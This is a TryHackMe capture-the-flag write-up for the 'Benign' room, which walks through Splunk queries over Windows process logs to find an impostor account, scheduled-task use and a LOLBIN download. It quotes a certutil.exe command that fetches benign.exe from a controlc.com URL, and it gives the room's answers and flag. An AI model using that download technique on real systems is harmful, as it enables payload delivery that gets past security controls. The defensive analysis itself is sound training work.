# Benign - TryHackMe Write-Up

## **Introduction**

📊 Difficulty : Medium

Benign is a room from [TryHackMe](https://tryhackme.com) dealing with a seemingly benign system, which upon closer inspection reveals artifacts of potential malicious activities. 

This room focuses on understanding how to identify potential attacks via log analysis using **Splunk** in a real world environment.

--- 

### **Context**

>_”One of the client’s IDS indicated a potentially suspicious process execution indicating one of the hosts from the HR department was compromised. Some tools related to network information gathering / scheduled tasks were executed which confirmed the suspicion._
>
>_Due to limited resources, we could only pull the process execution logs with `Event ID: 4688` and ingested them into Splunk with the index `win_eventlogs` for further investigation._
>
>_About the Network Information : The network is divided into three logical segments. It will help in the investigation._
>
>__IT Department__
>
>_James_
>
>_Moin_
>
>_Katrina_
>
>__HR department__
>
>_-Haroon_
>
>_-Chris_
>
>_-Diana_
>
>__Marketing department__
>
>_-Bell_
>
>_-Amelia_
>
>_-Deepak”_

Before starting, we must deploy the machine associated with the room and enter the `MACHINE_IP` in the browser’s URL bar to access our SIEM.

### Q. How many logs are ingested from the month of March, 2022?

The room tells us the index the logs we must analyze are grouped under the `win_eventlogs` index. To answer this question, all we have to do is click the Search & Reporting tab, filter by `index=”win_eventlogs”` and select the correct time frame to include all logs ingested during `March 2022`.

<img width="1366" height="382" alt="Capture d'écran 2025-07-22 071650" src="https://github.com/user-attachments/assets/27fad175-dbd3-4f47-bc32-a59c1f0dc259" />

The search returns **13 959 events**.

**Answer** : 13 959

### Q. Imposter Alert: There seems to be an imposter account observed in the logs, what is the name of that user?

Since we have the list of users who should be on the network, we can simply go through all the usernames and identify any that might not belong.

To achieve this, we can create a table of all usernames by using the field `UserName`

```bash
index="win_eventlogs" |  table UserName | dedup UserName
```

With this command, we go through the logs listed under the `win_eventlogs` index and create a table from the extracted usernames, removing any duplicates.

<img width="506" height="470" alt="Capture d'écran 2025-07-22 072333" src="https://github.com/user-attachments/assets/d4af32cd-8186-4311-95ed-54cb2a010d2c" />

As we can see, a user named Amel1a is trying to impersonate Amelia from the Marketing department.

**Answer** : Amel1a

### Q. Which user from the HR department was observed to be running scheduled tasks?

To answer this question, I first researched which process could be associated with running scheduled tasks. 

I found a number of results such as `svhost.exe`, but searching for those didn’t return any result. 

I decided to broaden my research and look for any process containing the word “**task**” ran by members of the HR department : 

```bash
index="win_eventlogs" (UserName="haroon" OR UserName="Daina" OR UserName="Chris.fort") *task*
```

Since we know the usernames of the HR department team from the previous question.


One process that interested me was `schtasks.exe`.
<img width="1101" height="494" alt="Capture d'écran 2025-07-22 072838" src="https://github.com/user-attachments/assets/adc9c2fc-4bd7-4e41-9cb8-d143ee8ddf37" />

Filtering by `schtasks`, we find : 

```bash
index=”win_eventlogs” (UserName=”haroon” OR UserName=”Chris.fort” OR UserName=”Daina”) schtasks.exe
```
<img width="1553" height="561" alt="Capture d'écran 2025-07-22 181927" src="https://github.com/user-attachments/assets/e626b960-4f36-4cdb-a79c-5f033ddbf4cc" />

**Answer** : Chris.fort

### Q. Which user from the HR department executed a system process (LOLBIN) to download a payload from a file-sharing host.

```bash
index=”win_eventlogs” (UserName=”haroon” OR UserName=”Chris.fort” OR UserName=”Daina”) |table UserName ProcessName CommandLine | dedup ProcessName
```

With this command, we query all processes ran by the HR team members and the command associated with no duplicate processes.

<img width="1703" height="257" alt="Capture d'écran 2025-07-22 182151" src="https://github.com/user-attachments/assets/435a242b-d515-4f37-91a3-e50517b785c7" />

With the help of the `CommandLine` field, we find a  suspicious command ran by user **haroon** : `certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe` 

We can deduce that Haroon ran this command to download the `benign.exe` file from https://controlc.com/e4d11035 via the `certutil.exe` process.

We can confirm that this process is a LOGBIN process by checking its name on lolbas-project.github.io/ as suggested by the hint given with the question.
And effectively, `certutil.exe` is a binary used to download payloads.

<img width="1010" height="196" alt="Capture d'écran 2025-07-22 182943" src="https://github.com/user-attachments/assets/689e295b-f5b9-4b2a-9255-a150e51038e4" />

**Answer** : haroon

### Q. To bypass the security controls, which system process (lolbin) was used to download a payload from the internet?

We already know the answer from the previous question.

**Answer** : certutil.exe

### Q. What was the date that this binary was executed by the infected host? format (YYYY-MM-DD)

All we need is to add the `EventTime` field to the table of the previous 2 questions to obtain the time at which haroon executed `certutil.exe` to download the `benign.exe` payload

```bash
index="win_eventlogs" (UserName="Daina" OR UserName="haroon" OR UserName="Chris.fort") | table UserName ProcessName CommandLine EventTime | dedup ProcessName
```

<img width="1519" height="62" alt="Capture d'écran 2025-07-22 183357" src="https://github.com/user-attachments/assets/00419525-d0ea-4778-a64c-2c9de67420bb" />

**Answer** : 2022-03-04

For the remaining questions, I will give the answers directly since we already found them alongside the answer for Question 4.

### Q. Which third-party site was accessed to download the malicious payload ?

**Answer** : contolc.com

### Q. What is the name of the file that was saved on the host machine from the C2 server during the post-exploitation phase?

**Answer** : benign.exe

### Q. The suspicious file downloaded from the C2 server contained malicious content with the pattern THM{..........}; what is that pattern? What is the URL that the infected host connected to?

By accessing the link from Question 6, we find a textfile `flag.txt` containing the flag needed to answer this question.

<img width="1124" height="546" alt="Capture d'écran 2025-07-22 183854" src="https://github.com/user-attachments/assets/9445ef26-8510-4f8a-8727-484564f72bb0" />

**Answer** : THM{KJ&*H^B0}

**Answer** : https://controlc.com/e4d11035

---

# Conclusion 
Overall, I found this room to be a great way to familiarize myself with Splunk's query language. While some of the questions were a bit challenging, most of them required simple knowledge and understanding of Splunk’s interface and how to filter logs. One downside is the last couple questions which answers could all be found using the same query. Answering these questions was quite redundant as finding the answer to one lead to immediately finding the answer to the others. 

In the end, I think this room served as a good introduction into Splunk and how it could be used to detect suspicious and potentially malicious activities, with the presence of unauthorized hosts and processes representing vulnerabilities and allowing the compromised users to download payloads from third party sites. This room effectively demonstrates how logs play a vital role in ensuring accountability for users' actions.



